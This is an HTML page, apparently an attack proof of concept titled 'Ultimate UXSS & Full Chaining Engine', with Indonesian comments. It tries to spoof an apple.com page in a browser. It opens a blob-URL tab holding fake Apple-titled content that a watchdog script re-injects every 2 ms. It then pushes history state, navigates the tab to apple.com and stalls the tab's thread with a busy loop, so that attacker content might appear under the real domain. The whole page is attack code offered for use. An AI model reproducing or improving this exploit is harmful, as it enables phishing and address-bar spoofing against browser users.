<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Ultimate UXSS & Full Chaining Engine - Zero</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #050507;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
        gap: 16px;
        padding: 20px;
        box-sizing: border-box;
      }
      h1 {
        font-size: 22px;
        margin-bottom: 10px;
        color: #f5f5f7;
        text-align: center;
      }
      button {
        width: 100%;
        max-width: 420px;
        padding: 24px;
        font-size: 20px;
        font-weight: bold;
        background: #ff3b30;
        color: #fff;
        border: none;
        border-radius: 16px;
        cursor: pointer;
        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.45);
        transition: transform 0.1s ease;
      }
      button:active {
        transform: scale(0.96);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>UXSS & Chaining Engine</h1>
      <button id="startBtn">EXECUTE UNIFIED UXSS CHAIN</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // 1. Membangun Payload Self-Sustaining Vector (Termasuk Self-Healing Watchdog di dalam konteks target)
        const payloadHtml = `
          <!DOCTYPE html>
          <html>
          <head>
            <title>Apple</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
          </head>
          <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
            <h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
            <script>
              // Watchdog Mandiri untuk menjaga struktur DOM tetap bertahan sebelum navigasi commit
              try {
                const observer = new MutationObserver(() => {
                  if (!document.getElementById('spoof-text')) {
                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                  }
                });
                observer.observe(document.documentElement, { childList: true, subtree: true });
              } catch(e) {}

              setInterval(() => {
                try {
                  if (!document.getElementById('spoof-text') || document.body.innerText.trim() !== 'HALLO') {
                    document.open();
                    document.write('<!DOCTYPE html><html><head><title>Apple</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;"><h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1></body></html>');
                    document.close();
                  }
                } catch(err) {}
              }, 2);
            <\/script>
          </body>
          </html>
        `;

        // Mengonversi payload menjadi Blob Stream untuk bypass about:blank instan
        const blob = new Blob([payloadHtml], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);

        // 2. Membuka jendela baru mengarah ke Blob Vector
        const newTab = window.open(blobUrl, "_blank");

        if (newTab) {
          try { newTab.focus(); } catch (e) {}

          // 3. Rantai Chain Step A (8ms): Melakukan pencemaran antrean history state
          setTimeout(() => {
            try {
              newTab.history.pushState({uxss_chain: true}, "", "#secure-enclave-vector");
            } catch (err) {}
          }, 8);

          // 4. Rantai Chain Step B (18ms): Memicu transisi navigasi utama ke domain target
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {}
          }, 18);

          // 5. Rantai Chain Step C (35ms): Mencoba mengeksekusi thread stalling lintas-origin dengan penanganan Exception yang aman
          setTimeout(() => {
            try {
              newTab.eval(`
                const startTime = Date.now();
                while (Date.now() - startTime < 6000) {
                  const reflow = document.body.offsetHeight;
                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fefefe';
                }
              `);
            } catch (e) {
              // Terjaga aman dari pembatasan Same-Origin Policy browser modern
              let start = Date.now();
              while (Date.now() - start < 6000) {}
            }
          }, 35);
        }
      };
    </script>
  </body>
</html>
